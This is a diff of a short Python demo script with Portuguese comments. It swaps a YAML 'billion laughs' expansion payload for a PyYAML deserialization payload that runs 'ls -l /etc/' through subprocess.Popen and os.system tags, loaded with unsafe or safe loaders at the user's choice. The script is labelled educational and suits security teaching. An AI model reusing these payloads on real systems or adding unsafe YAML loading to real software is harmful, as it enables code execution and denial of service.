@@ -1,43 +1,44 @@
 import yaml
+import subprocess
 import sys
+import os
+import io
 
-# Exemplo de YAML com referência circular
-yaml_milion_laughts = """
-a: &a ["AAAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAA"]
-b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
-c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]
-d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
-e: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d, *d]
-f: &f [*e, *e, *e, *e, *e, *e, *e, *e, *e, *e]
-g: &g [*f, *f, *f, *f, *f, *f, *f, *f, *f, *f]
-h: &h [*g, *g, *g, *g, *g, *g, *g, *g, *g, *g]
-i: &i [*h, *h, *h, *h, *h, *h, *h, *h, *h, *h]
-j: &j [*i, *i, *i, *i, *i, *i, *i, *i, *i, *i]
+# Aviso: Este script é para fins educacionais e de teste em ambiente seguro.
+
+# O payload malicioso
+# yaml_rce_payload = """
+# !!python/object/apply:os.system ['ls -l /etc/']
+# """
+
+yaml_rce_payload = """
+!!python/object/new:subprocess.Popen
+- [ls, -l, /etc/]
 """
 
-# 1. safe_load() é bem-sucedido e retorna o objeto circular!
-data = yaml.safe_load(yaml_milion_laughts)
+def demonstrar_rce(payload):
+    """
+    Recebe um payload YAML malicioso e tenta carregá-lo usando PyYAML,
+    demonstrando uma vulnerabilidade de execução remota de código (RCE).
+    Args:
+        payload (_type_): Payload YAML malicioso.
+    Returns: None
+    """
+    loader_class = yaml.Loader
 
-# 2. O ataque ocorre nesta linha, se a aplicação tentar iterar/serializar
-try:
-    print(f"Tamanho do objeto: {sys.getsizeof(data)}")
-    
-    # Exemplo de operação vulnerável: tentar criar uma string gigante
-    # Se você tentar imprimir a lista inteira, o Python tentará
-    # representar a estrutura recursiva, o que pode levar a:
-    # print(data) # Isso geralmente é evitado pelo Python, mas...
-    
-    # Operação de cópia/serialização que não detecta recursão
-    import copy
-    copia = copy.copy(data)
-    print(f"Cópia criada com sucesso. Tamanho da cópia: {copia}")
-    
-    print(f"Cópia concluída com sucesso (IMPOSSÍVEL neste caso).")
-    
-except RecursionError as e:
-    print(f"ERRO DE RECURSÃO detectado pelo Python: {e}")
-except Exception as e:
-    print(f"Outro erro durante o processamento: {e}")
+    try:
+        choice = input("Usar Loader inseguro? (s/n): ").strip().lower()
+        if choice == 's':
+            choice = input("Usar FullLoader? (s/n): ").strip().lower()
+            if choice == 's':
+                loader_class = yaml.FullLoader
+                dados = yaml.load(io.StringIO(payload), Loader=loader_class)
+            else:
+                dados = yaml.load(io.StringIO(payload), Loader=loader_class)
+        else:
+            dados = yaml.safe_load(io.StringIO(payload))
+    except Exception as e:
+        print(f"Erro ao carregar YAML: {e}")
 
-# Mesmo se o Python detectar a recursão (como no print()), a simples
-# existência do objeto circular ainda pode ser um problema de lógica.
+if __name__ == "__main__":
+    demonstrar_rce(yaml_rce_payload)
